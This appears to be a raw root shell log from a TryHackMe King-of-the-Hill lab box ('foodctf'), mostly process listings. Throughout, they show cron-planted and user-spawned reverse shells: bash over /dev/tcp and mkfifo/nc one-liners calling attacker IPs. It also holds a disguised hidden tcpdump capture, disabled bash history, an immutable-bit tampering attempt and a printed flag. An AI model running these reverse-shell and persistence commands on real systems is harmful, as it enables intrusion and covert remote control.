root      7522  7521  0 17:31 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      7523  7522  0 17:31 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      7524  7523  0 17:31 ?        00:00:00  |           \_ bash -i
root      7838   785  0 17:32 ?        00:00:00  \_ /usr/sbin/CRON -f
root      7839  7838  0 17:32 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      7840  7839  0 17:32 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      7841  7840  0 17:32 ?        00:00:00  |           \_ bash -i
root      8155   785  0 17:33 ?        00:00:00  \_ /usr/sbin/CRON -f
root      8156  8155  0 17:33 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      8157  8156  0 17:33 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      8158  8157  0 17:33 ?        00:00:00  |           \_ bash -i
root      8458   785  0 17:34 ?        00:00:00  \_ /usr/sbin/CRON -f
root      8459  8458  0 17:34 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      8460  8459  0 17:34 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      8461  8460  0 17:34 ?        00:00:00  |           \_ bash -i
root      8801   785  0 17:35 ?        00:00:00  \_ /usr/sbin/CRON -f
root      8802  8801  0 17:35 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      8803  8802  0 17:35 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      8804  8803  0 17:35 ?        00:00:00  |           \_ bash -i
root      9114   785  0 17:36 ?        00:00:00  \_ /usr/sbin/CRON -f
root      9115  9114  0 17:36 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      9116  9115  0 17:36 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      9117  9116  0 17:36 ?        00:00:00  |           \_ bash -i
root      9405   785  0 17:37 ?        00:00:00  \_ /usr/sbin/CRON -f
root      9406  9405  0 17:37 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      9407  9406  0 17:37 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      9408  9407  0 17:37 ?        00:00:00  |           \_ bash -i
root      9728   785  0 17:38 ?        00:00:00  \_ /usr/sbin/CRON -f
root      9729  9728  0 17:38 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      9730  9729  0 17:38 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      9731  9730  0 17:38 ?        00:00:00  |           \_ bash -i
root     10038   785  0 17:39 ?        00:00:00  \_ /usr/sbin/CRON -f
root     10039 10038  0 17:39 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root     10040 10039  0 17:39 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root     10041 10040  0 17:39 ?        00:00:00  |           \_ bash -i
root     10362   785  0 17:40 ?        00:00:00  \_ /usr/sbin/CRON -f
root     10363 10362  0 17:40 ?        00:00:00      \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root     10364 10363  0 17:40 ?        00:00:00          \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root     10365 10364  0 17:40 ?        00:00:00              \_ bash -i
root       806     1  0 17:16 ttyS0    00:00:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       819     1  0 17:16 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       822     1  0 17:16 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root       833     1  0 17:16 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
mysql      853     1  0 17:16 ?        00:00:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen     1178     1  0 17:17 ?        00:00:00 /lib/systemd/systemd --user
ramen     1183  1178  0 17:17 ?        00:00:00  \_ (sd-pam)
root      2723     1  0 17:20 ?        00:00:00 sshd: ramen [priv]
ramen     2792  2723  0 17:20 ?        00:00:00  \_ sshd: ramen@pts/0
ramen     2793  2792  0 17:20 pts/0    00:00:00      \_ -bash
root      3850  2793  0 17:23 pts/0    00:00:00          \_ -i
root      4108  3850  0 17:24 pts/0    00:00:00              \_ tcpdump -i any -w /tmp/.systemd-font-89f032hf9032
root        45     1  0 17:24 ?        00:00:00 /lib/sy
root      4553     1  0 17:24 ?        00:00:00 /usr/sbin/sshd -D
root      6873     1  0 17:28 ?        00:00:00 /bin/bash -c bash -i >& /dev/tcp/10.11.55.164/3737 0>&1
root      6882  6873  0 17:28 ?        00:00:00  \_ bash -i
root     10408  6882  0 17:40 ?        00:00:00      \_ ps -eaf --forest
root      7192     1  4 17:29 ?        00:00:28 /li
root     10032     1  0 17:38 pts/0    00:00:00 systemd-pam
root@foodctf:~# 

root@foodctf:~# ps -eaf --forest
ps -eaf --forest
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 17:16 ?        00:00:00 [kthreadd]
root         4     2  0 17:16 ?        00:00:00  \_ [kworker/0:0H]
root         5     2  0 17:16 ?        00:00:00  \_ [kworker/u30:0]
root         6     2  0 17:16 ?        00:00:00  \_ [mm_percpu_wq]
root         7     2  0 17:16 ?        00:00:00  \_ [ksoftirqd/0]
root         8     2  0 17:16 ?        00:00:01  \_ [rcu_sched]
root         9     2  0 17:16 ?        00:00:00  \_ [rcu_bh]
root        10     2  0 17:16 ?        00:00:00  \_ [migration/0]
root        11     2  0 17:16 ?        00:00:00  \_ [watchdog/0]
root        12     2  0 17:16 ?        00:00:00  \_ [cpuhp/0]
root        13     2  0 17:16 ?        00:00:00  \_ [kdevtmpfs]
root        14     2  0 17:16 ?        00:00:00  \_ [netns]
root        15     2  0 17:16 ?        00:00:00  \_ [rcu_tasks_kthre]
root        16     2  0 17:16 ?        00:00:00  \_ [kauditd]
root        17     2  0 17:16 ?        00:00:00  \_ [xenbus]
root        18     2  0 17:16 ?        00:00:00  \_ [xenwatch]
root        19     2  0 17:16 ?        00:00:00  \_ [kworker/0:1]
root        20     2  0 17:16 ?        00:00:00  \_ [khungtaskd]
root        21     2  0 17:16 ?        00:00:00  \_ [oom_reaper]
root        22     2  0 17:16 ?        00:00:00  \_ [writeback]
root        23     2  0 17:16 ?        00:00:00  \_ [kcompactd0]
root        24     2  0 17:16 ?        00:00:00  \_ [ksmd]
root        25     2  0 17:16 ?        00:00:00  \_ [khugepaged]
root        26     2  0 17:16 ?        00:00:00  \_ [crypto]
root        27     2  0 17:16 ?        00:00:00  \_ [kintegrityd]
root        28     2  0 17:16 ?        00:00:00  \_ [kblockd]
root        29     2  0 17:16 ?        00:00:00  \_ [ata_sff]
root        30     2  0 17:16 ?        00:00:00  \_ [md]
root        31     2  0 17:16 ?        00:00:00  \_ [edac-poller]
root        32     2  0 17:16 ?        00:00:00  \_ [devfreq_wq]
root        33     2  0 17:16 ?        00:00:00  \_ [watchdogd]
root        34     2  0 17:16 ?        00:00:00  \_ [kworker/u30:1]
root        36     2  0 17:16 ?        00:00:01  \_ [kswapd0]
root        37     2  0 17:16 ?        00:00:00  \_ [kworker/u31:0]
root        38     2  0 17:16 ?        00:00:00  \_ [ecryptfs-kthrea]
root        80     2  0 17:16 ?        00:00:00  \_ [kthrotld]
root        81     2  0 17:16 ?        00:00:00  \_ [acpi_thermal_pm]
root        82     2  0 17:16 ?        00:00:00  \_ [scsi_eh_0]
root        83     2  0 17:16 ?        00:00:00  \_ [scsi_tmf_0]
root        84     2  0 17:16 ?        00:00:00  \_ [scsi_eh_1]
root        85     2  0 17:16 ?        00:00:00  \_ [scsi_tmf_1]
root        86     2  0 17:16 ?        00:00:00  \_ [kworker/u30:2]
root        91     2  0 17:16 ?        00:00:00  \_ [ipv6_addrconf]
root       100     2  0 17:16 ?        00:00:00  \_ [kstrp]
root       117     2  0 17:16 ?        00:00:00  \_ [charger_manager]
root       192     2  0 17:16 ?        00:00:00  \_ [ttm_swap]
root       278     2  0 17:16 ?        00:00:00  \_ [raid5wq]
root       331     2  0 17:16 ?        00:00:00  \_ [jbd2/xvda2-8]
root       332     2  0 17:16 ?        00:00:00  \_ [ext4-rsv-conver]
root       382     2  0 17:16 ?        00:00:00  \_ [kworker/0:1H]
root       400     2  0 17:16 ?        00:00:00  \_ [iscsi_eh]
root       417     2  0 17:16 ?        00:00:00  \_ [ib-comp-wq]
root       418     2  0 17:16 ?        00:00:00  \_ [ib-comp-unb-wq]
root       419     2  0 17:16 ?        00:00:00  \_ [ib_mcast]
root       421     2  0 17:16 ?        00:00:00  \_ [ib_nl_sa_wq]
root       426     2  0 17:16 ?        00:00:00  \_ [rdma_cm]
root       445     2  0 17:16 ?        00:00:00  \_ [loop0]
root       446     2  0 17:16 ?        00:00:00  \_ [loop1]
root      9645     2  0 17:37 ?        00:00:00  \_ [kworker/0:2]
root     11296     2  0 17:42 ?        00:00:00  \_ [kworker/0:0]
root     11581     2  0 17:43 ?        00:00:00  \_ [kworker/u30:3]
root         1     0  0 17:16 ?        00:00:06 /sbin/init maybe-ubiquity
root       396     1  0 17:16 ?        00:00:01 /lib/systemd/systemd-journald
root       422     1  0 17:16 ?        00:00:00 /sbin/lvmetad -f
root       428     1  0 17:16 ?        00:00:04 /lib/systemd/systemd-udevd
systemd+   521     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-timesyncd
systemd+   630     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-networkd
systemd+   633     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-resolved
root       743     1  0 17:16 ?        00:00:02 /usr/bin/lxcfs /var/lib/lxcfs/
message+   753     1  0 17:16 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       764     1  0 17:16 ?        00:00:00 /usr/sbin/inetd
syslog     765     1  0 17:16 ?        00:00:00 /usr/sbin/rsyslogd -n
root       769     1  0 17:16 ?        00:00:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
bread      772     1  0 17:16 ?        00:00:00 /home/bread/main
bread     2328   772  0 17:19 ?        00:00:00  \_ bash -c bash -i >& /dev/tcp/10.8.162.106/4444 0>&1
bread     2329  2328  0 17:19 ?        00:00:00  |   \_ bash -i
bread     3794   772  0 17:23 ?        00:00:00  \_ bash -c bash -i >& /dev/tcp/10.8.162.106/4444 0>&1
bread     3795  3794  0 17:23 ?        00:00:00  |   \_ bash -i
root      4053  3795  0 17:24 ?        00:00:00  |       \_ [sh]
bread    10652   772  0 17:40 ?        00:00:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.100.18 1234 >/tmp/f
bread    10655 10652  0 17:40 ?        00:00:00  |   \_ cat /tmp/f
bread    11109   772  0 17:42 ?        00:00:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 1234 >/tmp/f
bread    11113 11109  0 17:42 ?        00:00:00  |   \_ cat /tmp/f
bread    11240   772  0 17:42 ?        00:00:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.100.18 1234 >/tmp/f
bread    11244 11240  0 17:42 ?        00:00:00  |   \_ cat /tmp/f
bread    11415   772  0 17:43 ?        00:00:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.100.18  1234 >/tmp/f
bread    11419 11415  0 17:43 ?        00:00:00      \_ cat /tmp/f
root       773     1  0 17:16 ?        00:00:00 /root/koth
tryhack+   776     1  0 17:16 ?        00:00:00 /home/tryhackme/img
root       777     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-logind
root       780     1  0 17:16 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
daemon     783     1  0 17:16 ?        00:00:00 /usr/sbin/atd -f
root       784     1  0 17:16 ?        00:00:09 /usr/lib/snapd/snapd
root       785     1  0 17:16 ?        00:00:00 /usr/sbin/cron -f
root      4656   785  0 17:25 ?        00:00:00  \_ /usr/sbin/CRON -f
root      4657  4656  0 17:25 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      4658  4657  0 17:25 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      4659  4658  0 17:25 ?        00:00:00  |           \_ bash -i
root      5307   785  0 17:26 ?        00:00:00  \_ /usr/sbin/CRON -f
root      5308  5307  0 17:26 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      5309  5308  0 17:26 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      5310  5309  0 17:26 ?        00:00:00  |           \_ bash -i
root       155   785  0 17:27 ?        00:00:00  \_ /usr/sbin/CRON -f
root       156   155  0 17:27 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root       157   156  0 17:27 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root       158   157  0 17:27 ?        00:00:00  |           \_ bash -i
root      6322   785  0 17:28 ?        00:00:00  \_ /usr/sbin/CRON -f
root      6323  6322  0 17:28 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      6324  6323  0 17:28 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      6325  6324  0 17:28 ?        00:00:00  |           \_ bash -i
root      6908   785  0 17:29 ?        00:00:00  \_ /usr/sbin/CRON -f
root      6909  6908  0 17:29 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      6910  6909  0 17:29 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      6911  6910  0 17:29 ?        00:00:00  |           \_ bash -i
root      7211   785  0 17:30 ?        00:00:00  \_ /usr/sbin/CRON -f
root      7212  7211  0 17:30 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      7213  7212  0 17:30 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      7214  7213  0 17:30 ?        00:00:00  |           \_ bash -i
root      7521   785  0 17:31 ?        00:00:00  \_ /usr/sbin/CRON -f
root      7522  7521  0 17:31 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      7523  7522  0 17:31 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      7524  7523  0 17:31 ?        00:00:00  |           \_ bash -i
root      7838   785  0 17:32 ?        00:00:00  \_ /usr/sbin/CRON -f
root      7839  7838  0 17:32 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      7840  7839  0 17:32 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      7841  7840  0 17:32 ?        00:00:00  |           \_ bash -i
root      8458   785  0 17:34 ?        00:00:00  \_ /usr/sbin/CRON -f
root      8459  8458  0 17:34 ?        00:00:00      \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      8460  8459  0 17:34 ?        00:00:00          \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      8461  8460  0 17:34 ?        00:00:00              \_ bash -i
root       806     1  0 17:16 ttyS0    00:00:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       819     1  0 17:16 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       822     1  0 17:16 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root       833     1  0 17:16 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
mysql      853     1  0 17:16 ?        00:00:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen     1178     1  0 17:17 ?        00:00:00 /lib/systemd/systemd --user
ramen     1183  1178  0 17:17 ?        00:00:00  \_ (sd-pam)
root      2723     1  0 17:20 ?        00:00:00 sshd: ramen [priv]
ramen     2792  2723  0 17:20 ?        00:00:00  \_ sshd: ramen@pts/0
ramen     2793  2792  0 17:20 pts/0    00:00:00      \_ -bash
root      3850  2793  0 17:23 pts/0    00:00:00          \_ -i
root      4108  3850  0 17:24 pts/0    00:00:00              \_ tcpdump -i any -w /tmp/.systemd-font-89f032hf9032
root        45     1  0 17:24 ?        00:00:00 /lib/sy
root      4553     1  0 17:24 ?        00:00:00 /usr/sbin/sshd -D
root      6873     1  0 17:28 ?        00:00:00 /bin/bash -c bash -i >& /dev/tcp/10.11.55.164/3737 0>&1
root      6882  6873  0 17:28 ?        00:00:00  \_ bash -i
root     11859  6882  0 17:44 ?        00:00:00      \_ ps -eaf --forest
root      7192     1  4 17:29 ?        00:00:41 /li
root     10032     1  0 17:38 pts/0    00:00:00 systemd-pam
root@foodctf:~# 

root@foodctf:~# ls -la
ls -la
total 7260
drwx------  4 root root    4096 Nov  5 17:19 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Nov  5 17:19 .bash_history -> /dev/null
-rw-r--r--  1 root root    3412 Nov  5 17:24 .bashrc
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Nov  5 17:44 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Nov  5 17:18 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
root@foodctf:~# cd /var
cd /var
root@foodctf:/var# ls -la
ls -la
total 56
drwxr-xr-x 13 root root   4096 Nov  5 17:18 .
drwxr-xr-x 24 root root   4096 Mar 19  2020 ..
drwxr-xr-x  2 root root   4096 Mar 20  2020 backups
drwxr-xr-x 10 root root   4096 Mar 19  2020 cache
drwxrwxrwt  2 root root   4096 Nov  5 17:29 crash
-rw-r--r--  1 root root     38 Mar 28  2020 flag.txt
drwxr-xr-x 41 root root   4096 Mar 20  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Aug  5  2019 lock -> /run/lock
drwxrwxr-x 10 root syslog 4096 Mar 30  2020 log
drwxrwsr-x  2 root mail   4096 Aug  5  2019 mail
drwxr-xr-x  2 root root   4096 Aug  5  2019 opt
lrwxrwxrwx  1 root root      4 Aug  5  2019 run -> /run
drwxr-xr-x  3 root root   4096 Mar 19  2020 snap
drwxr-xr-x  4 root root   4096 Aug  5  2019 spool
drwxrwxrwt  5 root root   4096 Nov  5 17:18 tmp
root@foodctf:/var# cat flag.txt
cat flag.txt
thm{0c48608136e6f8c86aecdb5d4c3d7ba8}
root@foodctf:/var# cd
cd
root@foodctf:~# ls -la
ls -la
total 7260
drwx------  4 root root    4096 Nov  5 17:19 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Nov  5 17:19 .bash_history -> /dev/null
-rw-r--r--  1 root root    3412 Nov  5 17:24 .bashrc
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Nov  5 17:45 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Nov  5 17:18 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
root@foodctf:~# ls -la
ls -la
total 7260
drwx------  4 root root    4096 Nov  5 17:19 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Nov  5 17:19 .bash_history -> /dev/null
-rw-r--r--  1 root root    3412 Nov  5 17:24 .bashrc
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Nov  5 17:45 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Nov  5 17:18 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
root@foodctf:~# lsattr
lsattr
----i------------- ./king.txt
----i---------e--- ./koth
--------------e--- ./flag
root@foodctf:~# /tmp/c -ia king.txt; echo a > king.txt
/tmp/c -ia king.txt; echo a > king.txt
cur attrs: 0x00000000, mask: 0x00000030
new attrs: 0x00000000
bash: [6882: 2 (255)] tcsetattr: Inappropriate ioctl for device
root@foodctf:~# lsattr
lsattr
----i------------- ./king.txt
----i---------e--- ./koth
--------------e--- ./flag
root@foodctf:~# ls -la
ls -la
total 7260
drwx------  4 root root    4096 Nov  5 17:19 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Nov  5 17:19 .bash_history -> /dev/null
-rw-r--r--  1 root root    3412 Nov  5 17:24 .bashrc
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Nov  5 17:55 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Nov  5 17:18 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
root@foodctf:~# ps -eaf --forest
ps -eaf --forest
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 17:16 ?        00:00:00 [kthreadd]
root         4     2  0 17:16 ?        00:00:00  \_ [kworker/0:0H]
root         5     2  0 17:16 ?        00:00:00  \_ [kworker/u30:0]
root         6     2  0 17:16 ?        00:00:00  \_ [mm_percpu_wq]
root         7     2  0 17:16 ?        00:00:00  \_ [ksoftirqd/0]
root         8     2  0 17:16 ?        00:00:02  \_ [rcu_sched]
root         9     2  0 17:16 ?        00:00:00  \_ [rcu_bh]
root        10     2  0 17:16 ?        00:00:00  \_ [migration/0]
root        11     2  0 17:16 ?        00:00:00  \_ [watchdog/0]
root        12     2  0 17:16 ?        00:00:00  \_ [cpuhp/0]
root        13     2  0 17:16 ?        00:00:00  \_ [kdevtmpfs]
root        14     2  0 17:16 ?        00:00:00  \_ [netns]
root        15     2  0 17:16 ?        00:00:00  \_ [rcu_tasks_kthre]
root        16     2  0 17:16 ?        00:00:00  \_ [kauditd]
root        17     2  0 17:16 ?        00:00:00  \_ [xenbus]
root        18     2  0 17:16 ?        00:00:00  \_ [xenwatch]
root        19     2  0 17:16 ?        00:00:00  \_ [kworker/0:1]
root        20     2  0 17:16 ?        00:00:00  \_ [khungtaskd]
root        21     2  0 17:16 ?        00:00:00  \_ [oom_reaper]
root        22     2  0 17:16 ?        00:00:00  \_ [writeback]
root        23     2  0 17:16 ?        00:00:00  \_ [kcompactd0]
root        24     2  0 17:16 ?        00:00:00  \_ [ksmd]
root        25     2  0 17:16 ?        00:00:00  \_ [khugepaged]
root        26     2  0 17:16 ?        00:00:00  \_ [crypto]
root        27     2  0 17:16 ?        00:00:00  \_ [kintegrityd]
root        28     2  0 17:16 ?        00:00:00  \_ [kblockd]
root        29     2  0 17:16 ?        00:00:00  \_ [ata_sff]
root        30     2  0 17:16 ?        00:00:00  \_ [md]
root        31     2  0 17:16 ?        00:00:00  \_ [edac-poller]
root        32     2  0 17:16 ?        00:00:00  \_ [devfreq_wq]
root        33     2  0 17:16 ?        00:00:00  \_ [watchdogd]
root        36     2  0 17:16 ?        00:00:01  \_ [kswapd0]
root        37     2  0 17:16 ?        00:00:00  \_ [kworker/u31:0]
root        38     2  0 17:16 ?        00:00:00  \_ [ecryptfs-kthrea]
root        80     2  0 17:16 ?        00:00:00  \_ [kthrotld]
root        81     2  0 17:16 ?        00:00:00  \_ [acpi_thermal_pm]
root        82     2  0 17:16 ?        00:00:00  \_ [scsi_eh_0]
root        83     2  0 17:16 ?        00:00:00  \_ [scsi_tmf_0]
root        84     2  0 17:16 ?        00:00:00  \_ [scsi_eh_1]
root        85     2  0 17:16 ?        00:00:00  \_ [scsi_tmf_1]
root        86     2  0 17:16 ?        00:00:00  \_ [kworker/u30:2]
root        91     2  0 17:16 ?        00:00:00  \_ [ipv6_addrconf]
root       100     2  0 17:16 ?        00:00:00  \_ [kstrp]
root       117     2  0 17:16 ?        00:00:00  \_ [charger_manager]
root       192     2  0 17:16 ?        00:00:00  \_ [ttm_swap]
root       278     2  0 17:16 ?        00:00:00  \_ [raid5wq]
root       331     2  0 17:16 ?        00:00:00  \_ [jbd2/xvda2-8]
root       332     2  0 17:16 ?        00:00:00  \_ [ext4-rsv-conver]
root       382     2  0 17:16 ?        00:00:00  \_ [kworker/0:1H]
root       400     2  0 17:16 ?        00:00:00  \_ [iscsi_eh]
root       417     2  0 17:16 ?        00:00:00  \_ [ib-comp-wq]
root       418     2  0 17:16 ?        00:00:00  \_ [ib-comp-unb-wq]
root       419     2  0 17:16 ?        00:00:00  \_ [ib_mcast]
root       421     2  0 17:16 ?        00:00:00  \_ [ib_nl_sa_wq]
root       426     2  0 17:16 ?        00:00:00  \_ [rdma_cm]
root       445     2  0 17:16 ?        00:00:00  \_ [loop0]
root       446     2  0 17:16 ?        00:00:00  \_ [loop1]
root     11296     2  0 17:42 ?        00:00:00  \_ [kworker/0:0]
root     11581     2  0 17:43 ?        00:00:00  \_ [kworker/u30:3]
root     12934     2  0 17:48 ?        00:00:00  \_ [kworker/0:2]
root     14032     2  0 17:51 ?        00:00:00  \_ [kworker/0:3]
root         1     0  0 17:16 ?        00:00:06 /sbin/init maybe-ubiquity
root       396     1  0 17:16 ?        00:00:02 /lib/systemd/systemd-journald
root       422     1  0 17:16 ?        00:00:00 /sbin/lvmetad -f
root       428     1  0 17:16 ?        00:00:06 /lib/systemd/systemd-udevd
systemd+   521     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-timesyncd
systemd+   630     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-networkd
systemd+   633     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-resolved
root       743     1  0 17:16 ?        00:00:02 /usr/bin/lxcfs /var/lib/lxcfs/
message+   753     1  0 17:16 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       764     1  0 17:16 ?        00:00:00 /usr/sbin/inetd
syslog     765     1  0 17:16 ?        00:00:00 /usr/sbin/rsyslogd -n
root       769     1  0 17:16 ?        00:00:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
bread      772     1  0 17:16 ?        00:00:00 /home/bread/main
bread     2328   772  0 17:19 ?        00:00:00  \_ bash -c bash -i >& /dev/tcp/10.8.162.106/4444 0>&1
bread     2329  2328  0 17:19 ?        00:00:00  |   \_ bash -i
bread     3794   772  0 17:23 ?        00:00:00  \_ bash -c bash -i >& /dev/tcp/10.8.162.106/4444 0>&1
bread     3795  3794  0 17:23 ?        00:00:00  |   \_ bash -i
bread    10652   772  0 17:40 ?        00:00:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.100.18 1234 >/tmp/f
bread    10655 10652  0 17:40 ?        00:00:00  |   \_ cat /tmp/f
bread    11109   772  0 17:42 ?        00:00:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 1234 >/tmp/f
bread    11113 11109  0 17:42 ?        00:00:00  |   \_ cat /tmp/f
bread    11240   772  0 17:42 ?        00:00:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.100.18 1234 >/tmp/f
bread    11244 11240  0 17:42 ?        00:00:00  |   \_ cat /tmp/f
bread    11415   772  0 17:43 ?        00:00:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.100.18  1234 >/tmp/f
bread    11419 11415  0 17:43 ?        00:00:00  |   \_ cat /tmp/f
